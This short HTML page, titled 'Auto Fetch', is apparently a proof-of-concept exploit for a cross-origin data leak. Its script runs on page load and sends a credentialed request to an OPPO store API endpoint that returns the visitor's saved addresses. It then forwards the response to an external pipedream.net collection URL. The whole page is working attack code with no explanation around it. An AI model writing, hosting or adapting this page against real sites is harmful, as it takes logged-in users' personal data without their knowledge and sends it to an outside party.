<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Auto Fetch</title>
</head>
<body>
  <script>
    fetch("https://opsg-gateway-in.oppo.com/v2/api/rest/mallapp/user/address/list/fetch?storeViewCode=in&storeCode=in&configModule=3&countryCode=IN&deviceType=2&source=1", {
      method: "GET",
      credentials: "include"
    })
    .then(response => response.text())
    .then(data => {
      fetch("https://eoobtq8czxzqd46.m.pipedream.net?data=" + encodeURIComponent(data));
    })
    .catch(error => console.error("Error:", error));
  </script>
</body>
</html>
